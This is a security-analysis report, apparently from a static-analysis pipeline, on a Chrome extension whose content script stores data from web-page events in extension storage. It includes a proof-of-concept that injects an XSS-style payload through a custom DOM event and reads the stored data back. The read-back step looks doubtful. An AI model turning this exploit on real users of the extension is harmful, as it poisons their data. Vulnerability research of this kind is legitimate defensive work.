# CoCo Analysis: jeinonikancjbhinlhobkiiogmbicghk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both same flow, different data fields)

---

## Sink: cs_window_eventListener_GetReq → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jeinonikancjbhinlhobkiiogmbicghk/opgen_generated_files/cs_0.js
Line 500: window.addEventListener('GetReq',  function(data) {
Line 501: chrome.runtime.sendMessage({message: "push", querly: data.detail.querly, kadastr: data.detail.kadastr});

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener('GetReq', function(data) {
    chrome.runtime.sendMessage({
        message: "push",
        querly: data.detail.querly,      // ← attacker-controlled
        kadastr: data.detail.kadastr     // ← attacker-controlled
    });
}, false);

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if(request.message === 'push') {
            QuerlyData.Queries.push({
                id: request.querly,           // ← attacker-controlled
                kadastr: request.kadastr      // ← attacker-controlled
            });
            DB_save();  // Stores to chrome.storage.local
        }
    }
);

function DB_save(callback) {
    DB_setValue(ExtensionDataName, QuerlyData, function() {
        if(callback) callback();
    });
}

function DB_setValue(name, value, callback) {
    var obj = {};
    obj[name] = value;  // ← attacker-controlled data stored
    chrome.storage.local.set(obj, function() {
        if(callback) callback();
    });
}

// Storage retrieval path - Data flows back to attacker
chrome.extension.onConnect.addListener(function(port) {
    port.onMessage.addListener(function(msg) {
        if (msg.type === "get") {
            port.postMessage({
                type: "qtabl",
                data: QuerlyData.Queries  // ← Returns poisoned storage data
            });
        }
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (window.addEventListener)

**Attack:**

```javascript
// Attacker-controlled webpage on https://elreg.domclick.ru/* can inject malicious data
var maliciousEvent = new CustomEvent('GetReq', {
    detail: {
        querly: '<script>alert("XSS")</script>',
        kadastr: 'malicious_payload_data'
    }
});
window.dispatchEvent(maliciousEvent);

// Later, attacker can retrieve the poisoned storage via port connection
var port = chrome.runtime.connect();
port.postMessage({type: "get"});
port.onMessage.addListener(function(response) {
    // Receives poisoned QuerlyData.Queries array
    console.log("Poisoned data:", response.data);
});
```

**Impact:** Complete storage exploitation chain - attacker can poison the extension's storage with arbitrary data via DOM events, then retrieve the poisoned data back through port messaging. This allows an attacker-controlled webpage on the whitelisted domain (elreg.domclick.ru) to persistently store and retrieve arbitrary data through the extension, potentially leading to data exfiltration or manipulation of extension behavior.
